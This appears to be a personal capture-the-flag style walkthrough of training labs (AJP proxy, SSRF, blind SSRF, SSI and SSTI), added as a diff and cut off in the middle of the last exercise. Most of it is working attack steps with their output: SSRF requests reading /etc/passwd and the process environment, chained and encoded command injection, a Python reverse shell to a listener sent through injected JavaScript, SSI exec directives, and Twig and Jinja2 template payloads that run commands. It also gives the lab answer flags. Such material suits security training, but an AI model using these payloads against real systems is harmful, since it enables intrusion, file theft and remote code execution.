@@ -1,0 +1,905 @@
+[Nginx Reverse Proxy & AJP]
+
+[*] Target: 68.183.47.129:32672
+
+[Question 1] Replicate the steps shown in this section to connect to the above server's "hidden" Tomcat page through the AJP proxy, 
+             then write the Tomcat version as your answer
+
+             ( Remember that the port you will see next to "Target:" will be the AJP proxy port. Answer format: X.X.XX )
+
+    [Step 1] Download the Nginx source code and required module    
+
+        1. Download Nginx : 
+
+            # wget https://nginx.org/download/nginx-1.21.3.tar.gz
+            
+            # tar -xzvf nginx-1.21.3.tar.gz
+
+        2. Download the AJP module and libpcre3-dev (a necessary library with Nginx)
+
+            # git clone https://github.com/dvershinin/nginx_ajp_module.git
+
+            # cd nginx-1.21.3 
+
+            # sudo apt install libpcre3-dev
+
+    [Step 2] Compile Nginx source code with ajp_module
+
+        # ./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules
+
+        # make
+
+        # sudo make install
+
+    [Step 3] Create a configuration file pointing to the AJP Port (/etc/nginx/conf/nginx.conf)
+        
+        [Note] You can see more detail in "CBBH - nginx.config"
+
+    # curl http://127.0.0.1:8080
+
+            <!DOCTYPE html>
+            <html lang="en">
+                <head>
+                    <meta charset="UTF-8" />
+                    <title>Apache Tomcat/8.0.53</title>
+                    <link href="favicon.ico" rel="icon" type="image/x-icon" />
+                    <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
+                    <link href="tomcat.css" rel="stylesheet" type="text/css" />
+                </head>
+            ...
+
+    [!] Answer: "8.0.53"
+
+
+[SSRF Exploitation Example]
+
+[*] Target: 10.129.239.252
+
+[Question 1] Replicate what you learned in this section to gain code execution on the spawned target, 
+             then look for the flag in the root directory and submit the contents as your answer.
+
+    [Step 1] Discovering Open Ports
+
+        # nmap 10.129.239.252 -p- -sV -g 53 -Pn -disable-arp-ping
+
+            PORT     STATE SERVICE VERSION
+            22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+            80/tcp   open  http    Werkzeug httpd 2.0.2 (Python 3.8.12)
+            8080/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.12)
+            Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+            => HTTP service is opened! Good
+
+    [Step 2] Interacting with the Target
+
+        # curl -i http://10.129.239.252:80 
+
+            HTTP/1.0 302 FOUND
+            Content-Type: text/html; charset=utf-8
+            Content-Length: 242
+            Location: http://10.129.239.252/load?q=index.html
+            Server: Werkzeug/2.0.2 Python/3.8.12
+            Date: Mon, 29 May 2023 05:53:33 GMT
+
+            <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+            <title>Redirecting...</title>
+            <h1>Redirecting...</h1>
+            <p>You should be redirected automatically to target URL: <a href="/load?q=index.html">/load?q=index.html</a>. If not click the link.                                                                                                     
+
+            => Redirect status code! Oke 
+
+        # curl -i http://10.129.239.252:80/load?q=index.html 
+
+            HTTP/1.0 200 OK
+            Content-Type: text/html; charset=utf-8
+            Content-Length: 153
+            Server: Werkzeug/2.0.2 Python/3.8.12
+            Date: Mon, 29 May 2023 05:57:41 GMT
+
+            <html>
+            <!-- ubuntu-web.lalaguna.local & internal.app.local load resources via q parameter -->
+            <body>
+            <h1>Bad App</h1>
+            <a>Hello World!</a>
+            </body>
+            </html>        
+
+            => Now we know that the 'q' parameter is vulnerable, and can be exploited to interact with server-side
+
+                And they give us 2 server-side domain names "ubuntu-web.lalaguna.local" & "internal.app.local"
+
+    [Step 3] Testing for SSRF
+
+        1. Open a listener on our machine (/var/html/www)
+
+            # nc -lnvp 31337
+
+        2. As you can see in this URL "http://10.129.239.252:80/load?q=index.html", it shows the resources from its backend, what if I entered 
+
+            # curl -i http://10.129.239.252:80/load?q=http://10.10.16.27:31337
+
+            => # nc -lnvp 31337
+
+                    listening on [any] 31337 ...
+                    connect to [10.10.16.27] from (UNKNOWN) [10.129.239.252] 34042
+                    GET / HTTP/1.1
+                    Accept-Encoding: identity
+                    Host: 10.10.16.27:31337
+                    User-Agent: Python-urllib/3.8
+                    Connection: close
+
+            => You can see in the "User-Agent" header, Python-urllib is used to handle requests which support file, HTTP and ftp schemas
+
+            => We can also read local files via the file schema and remote files using HTTP
+
+        3. Start Python HTTP Server
+
+            # python3 -m http.server 31337 
+            
+                [Note] Run this command in the directory where your html file is located
+
+            # curl "http://10.129.239.252:80/load?q=http://10.10.16.27:31337/Tester.html" -i
+
+                HTTP/1.0 200 OK
+                Content-Type: text/html; charset=utf-8
+                Content-Length: 39
+                Server: Werkzeug/2.0.2 Python/3.8.12
+                Date: Mon, 29 May 2023 06:48:24 GMT
+
+                <html>
+                <p>thinhdeptraiprovip</p>
+                <html>      
+                
+    [Step 4] Retrieving a local file through the target application - File Schema
+
+        # curl -i http://10.129.239.252:80/load?q=file:///etc/passwd
+
+            HTTP/1.0 200 OK
+            Content-Type: text/html; charset=utf-8
+            Content-Length: 925
+            Server: Werkzeug/2.0.2 Python/3.8.12
+            Date: Mon, 29 May 2023 07:03:52 GMT
+
+            root:x:0:0:root:/root:/bin/bash
+            daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+            bin:x:2:2:bin:/bin:/usr/sbin/nologin
+            ...
+            gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+            nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+            _apt:x:100:65534::/nonexistent:/usr/sbin/nologin     
+
+        => However, there is a possibility of internal applications existing and listening only on localhost. 
+        We can use a tool such as ffuf to enumerate these web applications
+
+    [Step 5] Generate a Wordlist & Port Fuzzing
+
+        # for port in {1..65535};do echo $port >> port_number.txt;done
+
+        # ffuf -w ./port_number.txt:FUZZ -u "http://10.129.239.252:80/load?q=http://127.0.0.1:FUZZ" -fs 30
+
+            /'___\  /'___\           /'___\       
+           /\ \__/ /\ \__/  __  __  /\ \__/       
+           \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+            \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+             \ \_\   \ \_\  \ \____/  \ \_\       
+              \/_/    \/_/   \/___/    \/_/       
+
+                v2.0.0-dev
+            ________________________________________________
+
+            :: Method           : GET
+            :: URL              : http://10.129.239.252:80/load?q=http://127.0.0.1:FUZZ
+            :: Wordlist         : FUZZ: /home/bigbox/Desktop/port_number.txt
+            :: Follow redirects : false
+            :: Calibration      : false
+            :: Timeout          : 10
+            :: Threads          : 40
+            :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+            :: Filter           : Response size: 30
+            ________________________________________________
+
+            [Status: 200, Size: 153, Words: 12, Lines: 7, Duration: 699ms]
+                * FUZZ: 80
+
+            [Status: 200, Size: 64, Words: 3, Lines: 1, Duration: 272ms]
+                * FUZZ: 5000
+
+        # curl -i http://10.129.239.252:80/load?q=http://127.0.0.1:5000                   
+
+            HTTP/1.0 200 OK
+            Content-Type: text/html; charset=utf-8
+            Content-Length: 64
+            Server: Werkzeug/2.0.2 Python/3.8.12
+            Date: Mon, 29 May 2023 07:25:16 GMT
+
+            <html><body><h1>Hey!</h1><a>Some internal app!</a></body></html>
+
+        => Yeahhh! I think we need to go to internal.app.local
+
+        # curl -i http://10.129.239.252:80/load?q=http://internal.app.local
+
+            HTTP/1.0 200 OK
+            Content-Type: text/html; charset=utf-8
+            Content-Length: 83
+            Server: Werkzeug/2.0.2 Python/3.8.12
+            Date: Mon, 29 May 2023 07:27:45 GMT
+
+            <html>
+            <body>
+            <h1>Internal Web Application</h1>
+            <a>Hello World!</a>
+            </body>
+            </html> 
+
+        => Once again we need to discover if there are any web applications listening in localhost =(( 
+
+        # curl -i http://10.129.239.252:80/load?q=http://internal.app.local/load?q=http://127.0.0.1:1234
+
+            HTTP/1.0 200 OK
+            Content-Type: text/html; charset=utf-8
+            Content-Length: 101
+            Server: Werkzeug/2.0.2 Python/3.8.12
+            Date: Mon, 29 May 2023 07:30:37 GMT
+
+            <html><body><h1>Resource: http127.0.0.1:1234</h1><a>unknown url type: http127.0.0.1</a></body></html>
+        
+        => Resource: http127.0.0.1:1234, where is our "://", let's try this 
+
+        # curl -i http://10.129.239.252:80/load?q=http://internal.app.local/load?q=http://://127.0.0.1:1234 => Nope
+
+        # curl -i http://10.129.239.252:80/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1234
+
+            HTTP/1.0 200 OK
+            Content-Type: text/html; charset=utf-8
+            Content-Length: 103
+            Server: Werkzeug/2.0.2 Python/3.8.12
+            Date: Mon, 29 May 2023 07:33:05 GMT
+
+            <html><body><h1>Resource: http://127.0.0.1:1234</h1><a>[Errno 111] Connection refused</a></body></html>      
+
+        => It's fuzzing time =((
+
+    #  ffuf -w port_number.txt:FUZZ -u "http://10.129.24.212:80/load?q=http://internal.app.local/load?q=http::////127.0.0.1:FUZZ" -fr 'Errno[[:blank:]]111'
+
+            /'___\  /'___\           /'___\       
+            /\ \__/ /\ \__/  __  __  /\ \__/       
+            \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+             \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+              \ \_\   \ \_\  \ \____/  \ \_\       
+               \/_/    \/_/   \/___/    \/_/       
+
+       v2.0.0-dev
+        ________________________________________________
+
+        :: Method           : GET
+        :: URL              : http://10.129.24.212:80/load?q=http://internal.app.local/load?q=http::////127.0.0.1:FUZZ
+        :: Wordlist         : FUZZ: /home/bigbox/Desktop/port_number.txt
+        :: Follow redirects : false
+        :: Calibration      : false
+        :: Timeout          : 10
+        :: Threads          : 40
+        :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+        :: Filter           : Regexp: Errno[[:blank:]]111
+        ________________________________________________
+
+        [Status: 200, Size: 155, Words: 5, Lines: 7, Duration: 472ms]
+            * FUZZ: 80
+
+        [Status: 200, Size: 385, Words: 65, Lines: 8, Duration: 294ms]
+            * FUZZ: 5000
+
+    # curl -i http://10.129.24.212:80/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000
+            
+        HTTP/1.0 200 OK
+        Content-Type: text/html; charset=utf-8
+        Content-Length: 385
+        Server: Werkzeug/2.0.2 Python/3.8.12
+        Date: Mon, 29 May 2023 08:00:35 GMT
+
+        <html><body><h1>Resource: http://127.0.0.1:5000</h1><a>total 24K
+        drwxr-xr-x 1 root root 4.0K Nov  1  2021 .
+        drwxr-xr-x 1 root root 4.0K Nov  1  2021 ..
+        -rw-r--r-- 1 root root   84 Oct 28  2021 index.html
+        -rw-r--r-- 1 root root 1.2K Oct 28  2021 internal.py
+        -rw-r--r-- 1 root root  655 Oct 28  2021 internal_local.py
+        -rwxr-xr-x 1 root root   69 Oct 28  2021 start.sh
+        </a></body></html> 
+
+    [*] "Let us issue a request to disclose /proc/self/environ file, where the current path should be present under the PWD environment variable" =))
+
+    - if we go to "http://10.129.24.212:80/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" =>
+
+        HOSTNAME=f53c1f1e6368
+        PYTHON_VERSION=3.8.12
+        PWD=/app
+        PORT=80
+        PYTHON_SETUPTOOLS_VERSION=57.5.0
+        HOME=/root
+        LANG=C.UTF-8
+        GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568
+        SHLVL=0
+        PYTHON_PIP_VERSION=21.2.4
+        PYTHON_GET_PIP_SHA256=c518250e91a70d7b20cceb15272209a4ded2a0c263ae5776f129e0d9b5674309
+        PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/3cb8888cc2869620f57d5d2da64da38f516078c7/public/get-pip.py
+        PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_
+        _=/usr/local/bin/python3
+
+    - The current path is /app. Let's disclose the internal_local.py file
+
+        # curl -i http://10.129.24.212/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py         
+            
+            HTTP/1.0 200 OK
+            Content-Type: text/html; charset=utf-8
+            Content-Length: 736
+            Server: Werkzeug/2.0.2 Python/3.8.12
+            Date: Mon, 29 May 2023 08:17:58 GMT
+
+            <html><body><h1>Resource: file:///app/internal_local.py</h1><a>import os
+            from flask import *
+            import urllib
+            import subprocess
+
+            basedir = os.path.abspath(os.path.dirname(__file__))
+
+            app = Flask(__name__)
+
+            def run_command(command):
+                    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    stdout = p.stdout.read()
+                    stderr = p.stderr.read()
+                    result = stdout.decode() + " " + stderr.decode()
+                    return result
+
+            @app.route("/")
+            def index():
+                    return run_command("ls -lha")
+
+            @app.route("/runme")
+            def runmewithargs():
+                    command = request.args.get("x")
+                    if command == "":
+                            return "Use /runme?x=<CMD>"
+                    return run_command(command)
+
+            if __name__ == "__main__":
+                    app.run(host="127.0.0.1", port=5000)
+            </a></body></html>                                                                                                    
+   
+        => Now we know that we can run some commands at http://127.0.0.1:500/runme?x=<CMD>
+
+        - http://10.129.24.212/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami => root
+
+        - http://10.129.24.212/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=find / -name '*flag*' 2>/dev/null => 400 status code =((
+
+        - I think we must encode our commands 3 times because they have to go through three web applications.
+
+        => find / -name '*flag*' 2>/dev/null after 3 times URL encoded 
+        
+            <=> find%252520%25252F%252520-name%252520%252527%25252Aflag%25252A%252527%2525202%25253E%25252Fdev%25252Fnull
+
+        - http://10.129.24.212/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=find%252520%25252F%252520-name%252520%252527%25252Aflag%25252A%252527%2525202%25253E%25252Fdev%25252Fnull 
+
+            /root/flag.txt 
+            /proc/sys/kernel/acpi_video_flags 
+            /proc/sys/kernel/sched_domain/cpu0/domain0/flags
+            ...
+
+        => cat /root/flag.txt <=> cat%252520%25252Froot%25252Fflag.txt
+
+        - http://10.129.24.212/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=cat%252520%25252Froot%25252Fflag.txt 
+        
+        => HTB{55rf_2_rc3} 
+
+    [!] Answer: "HTB{55rf_2_rc3}"
+
+
+[Blind SSRF Exploitation Example]
+
+[*] Target: 10.129.239.252 (same target as the previous question)
+
+[Question 1] The target is vulnerable to blind SSRF. Leverage this blind SSRF vulnerability to interact with internal.app.local 
+             and achieve remote code execution against the internal service listening on port 5000, as you did in the previous section
+             Submit the kernel release number as your answer (Answer format: X.X.X-XX)
+
+    # nmap 10.129.239.252 -p- -sV -g 53 -Pn -disable-arp-ping
+
+        PORT     STATE SERVICE VERSION
+        22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+        80/tcp   open  http    Werkzeug httpd 2.0.2 (Python 3.8.12)
+        8080/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.12)
+        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    # curl -i http://10.129.239.252:8080/
+
+        HTTP/1.0 200 OK
+        Content-Type: text/html; charset=utf-8
+        Content-Length: 245
+        Set-Cookie: secret=YzNWd1pYSnpaV055WlhRSwo=; HttpOnly; Path=/
+        Server: Werkzeug/2.0.2 Python/3.8.12
+        Date: Mon, 29 May 2023 09:33:19 GMT
+
+        <!doctype html>
+        <title>Upload new File</title>
+        <h1>Upload a new html to convert to PDF</h1>
+        <form method=post enctype=multipart/form-data>
+        <input type=file name=file>
+        <input type=submit value=Upload>
+        </form>
+            
+        => Upload files =)) I think I can upload a php payload but when I use wappalyzer to search for this website's component, it was just Python and Flask
+
+    - The web said "Upload a new html to convert to PDF", I think it will process something (like interact or run the html code)
+
+        POST / HTTP/1.1
+        Host: 10.129.239.252:8080
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=---------------------------212799064925553037182560750700
+        Content-Length: 262
+        Origin: http://10.129.239.252:8080
+        Connection: close
+        Referer: http://10.129.239.252:8080/
+        Cookie: secret=YzNWd1pYSnpaV055WlhRSwo=
+        Upgrade-Insecure-Requests: 1
+
+        -----------------------------212799064925553037182560750700
+        Content-Disposition: form-data; name="file"; filename="Tester.html"
+        Content-Type: text/html
+
+        <html>
+        <p>thinhdeptraiprovip</p>
+        <img src="http://10.10.16.27:31337/non_exist_img.jgp">
+        <html>
+
+        -----------------------------212799064925553037182560750700--
+
+    => hehe =))
+
+    # nc -lnvp 31337    
+
+        listening on [any] 31337 ...
+        connect to [10.10.16.27] from (UNKNOWN) [10.129.239.252] 51672
+        GET /non_exist_img.jgp HTTP/1.1
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
+        Accept: */*
+        Connection: Keep-Alive
+        Accept-Encoding: gzip
+        Accept-Language: en,*
+        Host: 10.10.16.27:31337
+
+    => In the User-Agent header you will see "wkhtmltopdf" which means you can run JS in this system
+
+    - Remember where we ran commands in the previous question =)) 
+      but this time we only encoded the command 2 times oke =)) I think you understand the reason why
+
+    - To gather the kernel release and sent it back to my listener, I used a bash reverse shell
+
+      => export RHOST="10.10.16.27";export RPORT="12345";python -c 
+        'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+      <=> export%2520RHOST%253D%252210.10.16.27%2522%253Bexport%252....2Fbin%252Fsh%2522%2529%2527 (Just URL encode the shell I gave you 2 times oke)
+
+    - Then I created the kernel_spy.html
+
+        <html>
+            <script>
+            var http = new XMLHttpRequest();
+            http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST\....2Fbin%252Fsh%2522%2529%2527 ", true); 
+            http.send();
+            http.onerror = function(){document.write('<a>Oops!</a>');}
+            </script>
+        </html>    
+
+    $ nc -lnvp 12345   
+
+        listening on [any] 12345 ...
+        connect to [10.10.16.27] from (UNKNOWN) [10.129.239.252] 50644
+        # uname -a
+        Linux f53c1f1e6368 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 GNU/Linux
+
+    [!] Answer: "5.4.0-89"
+
+
+[Server-Side Includes Overview]
+
+[*] Target: 68.183.34.87:32206
+
+[Question 1] Use what you learned in this section to read the content of .htaccess.flag through SSI and submit it as your answer.
+
+- As you guys already know:
+
+    + Server Side Includes (SSI) is a technology that allows you to include dynamic content and perform server-side operations within static HTML files
+
+    + It enables you to add server-side functionality without relying on complex server-side scripting languages
+
+    + These directives are enclosed within <!--# and --> tags and instruct the server to perform specific actions
+
+            +-----------------------+
+            |                       |
+            |       HTML File       |
+            |                       |
+            |  <html>               |
+            |  <head>               |
+            |     ...               |
+            |  </head>              |
+            |  <body>               |
+            |     ...               |
+            |     <!--#directive -->|
+            |     ...               |
+            |  </body>              |
+            |  </html>              |
+            |                       |
+            +-----------------------+
+                        |
+                        |
+                Server Processing
+                        |
+                        v
+            +-----------------------+
+            |                       |
+            |     HTML Response     |
+            |                       |
+            |  <html>               |
+            |  <head>               |
+            |     ...               |
+            |  </head>              |
+            |  <body>               |
+            |     ...               |
+            |     Directive Result  |
+            |     ...               |
+            |  </body>              |
+            |  </html>              |
+            |                       |
+            +-----------------------+
+
+    - Go to http://68.183.34.87:32206 then enter your name. I entered 'Hung Thinh Tran dep trai pro vip' and then submited
+
+    => Hey Hung Thinh Tran Dep Trai Pro Vip,
+
+        You are using:
+
+        Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+
+    - Good! Let's use the directive to execute some commands 
+
+        + <!--#exec cmd="pwd" --> 
+        
+            =>  Hey /var/www/html ,
+
+                You are using:
+
+                Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+
+
+        + <!--#exec cmd="ls -al" -->
+
+            =>  drwxrwxrwx  1  www-data  www-data  4096  May 30 02:44  .
+                drwxr-xr-x  1  root      root      4096  Aug 19 2020  ..
+                -rw-r--r--  1  www-data  www-data    72  Oct 29 2021  .htaccess
+                -rw-r--r--  1  www-data  www-data    20  Oct 29 2021  .htaccess.flag
+                -rw-r--r--  1  www-data  www-data   325  Mar 8  2014  ClientAccessPolicy.xml
+                -rw-r--r--  1  www-data  www-data   200  Mar 11 2014  crossdomain.xml
+                -rw-r--r--  1  www-data  www-data  1049  Oct 29 2021  index.php
+                -rw-r--r--  1  www-data  www-data   105  May 30 03:17  ua.html
+
+        + <!--#exec cmd="cat .htaccess.flag" -->
+            
+            => HTB{Y0uV3GotSk1lls!}
+
+    [!] Answer: "HTB{Y0uV3GotSk1lls!}"
+
+
+[SSTI Exploitation Example 1]
+
+- As you already know: 
+
+    + Server-Side Template Injection (SSTI) is a type of vulnerability that occurs when an application allows user-supplied data to be injected and executed within server-side templates
+
+    + Many web frameworks and applications utilize template engines to generate dynamic HTML pages or other types of output
+
+      => Template engines allow developers to separate presentation logic from application logic by using templates with placeholders that are filled in with dynamic data during rendering
+
+    + Common template engines vulnerable to SSTI include Twig (used in PHP), Jinja2 (used in Python), FreeMarker (used in Java), Smarty (used in PHP), and others
+
+    + Identifying SSTI vulnerabilities typically involves injecting special payloads or template syntax to observe how the input is processed and rendered
+
+[*] Target: 143.110.162.223:32174
+
+[Question 1]  Use what you learned in this section to obtain the flag which is hidden in the environment variables. Answer format: HTB{String}
+
+    - Go to http://143.110.162.223:32174/ then entered your name => Hello Hung Thinh Tran!
+
+    - At this point, you can use tplmap to scan for vulnerabilities or use some tricks in https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+
+    - Some possible payloads that may cause errors:
+
+            [+] {{7*7}}
+
+            [+] ${7*7}
+
+            [+] <%= 7*7 %>
+
+            [+] ${{7*7}}
+
+            [+] #{7*7}
+
+            [+] *{7*7}
+
+    - Because I'm a super lazy boy so I would rather use tplmap ( I used python 3.9.2 )
+
+        POST / HTTP/1.1
+        Host: 143.110.162.223:32174
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 45
+        Origin: http://143.110.162.223:32174
+        Connection: close
+        Referer: http://143.110.162.223:32174/
+        Upgrade-Insecure-Requests: 1
+
+        name=Hung+Thinh+Tran+dep+trai+pro+vip&submit=
+
+    => python tplmap.py -u 'http://143.110.162.223:32174' -d name=hungthinhtran
+
+        [+] Tplmap 0.5
+            Automatic Server-Side Template Injection Detection and Exploitation Tool
+
+        [+] Testing if POST parameter 'name' is injectable
+        [+] Smarty plugin is testing rendering with tag '*'
+        [+] Smarty plugin is testing blind injection
+        [+] Mako plugin is testing rendering with tag '${*}'
+        [+] Mako plugin is testing blind injection
+        [+] Python plugin is testing rendering with tag 'str(*)'
+        [+] Python plugin is testing blind injection
+        [+] Tornado plugin is testing rendering with tag '{{*}}'
+        [+] Tornado plugin is testing blind injection
+        [+] Jinja2 plugin is testing rendering with tag '{{*}}'
+        [+] Jinja2 plugin is testing blind injection
+        [+] Twig plugin is testing rendering with tag '{{*}}'
+        [+] Twig plugin has confirmed injection with tag '{{*}}'
+        [+] Tplmap identified the following injection point:
+
+        POST parameter: name
+        Engine: Twig => "Common template engines vulnerable to SSTI include Twig (used in PHP)" =))
+        Injection: {{*}}
+        Context: text
+        OS: Linux
+        Technique: render
+        Capabilities:
+
+        Shell command execution: ok
+        Bind and reverse shell: ok
+        File write: ok
+        File read: ok
+        Code evaluation: ok, php code
+
+        => Now I know I can exploit using {{bla bla}}
+
+        Who are you? {{123456+654321}}
+        Hello 63403920! =))
+
+    - I'm not good when using PHP so Hacktrick is the best place to find things we need, and I found this: 
+
+        {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}} => Hello uid=0(root) gid=0(root) groups=0(root)!
+
+        => {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("printenv")}} => Hello FLAG=HTB{IWasJustAskingForYourName}!
+
+    [!] Answer: "HTB{IWasJustAskingForYourName}"
+
+
+[SSTI Exploitation Example 2]    
+
+[*] Target: 143.110.162.223:32712
+
+[Question 1] Use what you learned in this section to read the contents of flag.txt, which resides in the current working directory. 
+             Answer format: HTB{String}
+
+- Go to http://143.110.162.223:32712/, Enter your email, and submit
+
+    POST /jointheteam HTTP/1.1
+    Host: 143.110.162.223:32712
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 13
+    Origin: http://143.110.162.223:32712
+    Connection: close
+    Referer: http://143.110.162.223:32712/
+    Upgrade-Insecure-Requests: 1
+
+    email=hungthinhtran@gmail.com
+
+# python tplmap.py -u 'http://143.110.162.223:32712/jointheteam' -d email=hungthinhtran@gmail.com
+
+    [+] Tplmap 0.5
+        Automatic Server-Side Template Injection Detection and Exploitation Tool
+
+    [+] Testing if POST parameter 'email' is injectable
+    [+] Smarty plugin is testing rendering with tag '*'
+    [+] Smarty plugin is testing blind injection
+    [+] Mako plugin is testing rendering with tag '${*}'
+    [+] Mako plugin is testing blind injection
+    [+] Python plugin is testing rendering with tag 'str(*)'
+    [+] Python plugin is testing blind injection
+    [+] Tornado plugin is testing rendering with tag '{{*}}'
+    [+] Tornado plugin has confirmed injection with tag '{{*}}'
+    [+] Tplmap identified the following injection point:
+
+    POST parameter: email
+    Engine: Tornado => using python =)) 
+    Injection: {{*}}
+    Context: text
+    OS: posix-linux
+    Technique: render
+    Capabilities:
+
+    Shell command execution: ok
+    Bind and reverse shell: ok
+    File write: ok
+    File read: ok
+    Code evaluation: ok, python code
+
+    => Yeah just like the previous question I can use {{*}} to bypass the Filter
+
+        {{import os; os.system('whoami')}} => 500: Internal Server Error 
+
+        {{import os}}{{os.system('whoami')}} => 500: Internal Server Error 
+
+        {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} => 500: Internal Server Error 
+
+        {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }} => 500: Internal Server Error 
+
+        {{ namespace.__init__.__globals__.os.popen('id').read() }} => 500: Internal Server Error 
+
+        {{ lipsum.__globals__["os"].popen('id').read() }} => 500: Internal Server Error 
+
+        {{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}} => 500: Internal Server Error 
+
+        {{config.__class__.__init__.__globals__['os'].popen('ls').read()}} => 500: Internal Server Error 
+
+    - Nooooo =(( But there is another way =))
+
+    # python tplmap.py -u 'http://143.110.162.223:32712/jointheteam' -d email=thinh@gmail.com --os-shell
+
+        ...
+        [+] Run commands on the operating system.
+        posix-linux $ ls -al
+        total 20
+        drwxr-xr-x 1 root root 4096 Nov  1  2021 .
+        drwxr-xr-x 1 root root 4096 May 30 10:04 ..
+        -rw-r--r-- 1 root root  920 Oct 29  2021 app.py
+        -rw-r--r-- 1 root root   28 Oct 29  2021 flag.txt
+        drwxr-xr-x 2 root root 4096 Nov  1  2021 templates
+        posix-linux $ cat flag.txt
+        HTB{6M1ll1onD0ll4rD3v3l0p3r}    
+
+    [!] Answer: "HTB{6M1ll1onD0ll4rD3v3l0p3r}"
+
+
+[SSTI Exploitation Example 3]
+
+[*] Target: 134.209.180.248:32674
+
+[Question 3] Use what you learned in this section to read the contents of flag.txt, which resides in the current working directory. Answer format: HTB{String}
+
+    - Go to http://134.209.180.248:32674/ and enter any command you want, I entered "ipconfig" => Nothing
+
+    => As a lazy man once said "..." => Yeah! he was too lazy to talk, but in this case, it means "use tplmap"
+
+    $ python tplmap.py -u 'http://134.209.180.248:32674/execute?cmd=ipconfig' --os-shell
+
+        [+] Tplmap 0.5
+        Automatic Server-Side Template Injection Detection and Exploitation Tool
+
+        [+] Testing if GET parameter 'cmd' is injectable
+        [+] Smarty plugin is testing rendering with tag '*'
+        [+] Smarty plugin is testing blind injection
+        [+] Mako plugin is testing rendering with tag '${*}'
+        [+] Mako plugin is testing blind injection
+        [+] Python plugin is testing rendering with tag 'str(*)'
+        [+] Python plugin is testing blind injection
+        [+] Tornado plugin is testing rendering with tag '{{*}}'
+        [+] Tornado plugin is testing blind injection
+        [+] Jinja2 plugin is testing rendering with tag '{{*}}'
+        [+] Jinja2 plugin has confirmed injection with tag '{{*}}'
+        [+] Tplmap identified the following injection point:
+
+        GET parameter: cmd
+        Engine: Jinja2
+        Injection: {{*}}
+        Context: text
+        OS: posix-linux
+        Technique: render
+        Capabilities:
+
+        Shell command execution: ok
+        Bind and reverse shell: ok
+        File write: ok
+        File read: ok
+        Code evaluation: ok, python code
+
+        [+] Run commands on the operating system.
+        posix-linux $ ls -al
+        total 24
+        drwxr-xr-x 1 root root 4096 Nov  1  2021 .
+        drwxr-xr-x 1 root root 4096 May 30 11:38 ..
+        -rw-r--r-- 1 root root  780 Oct 28  2021 app.py
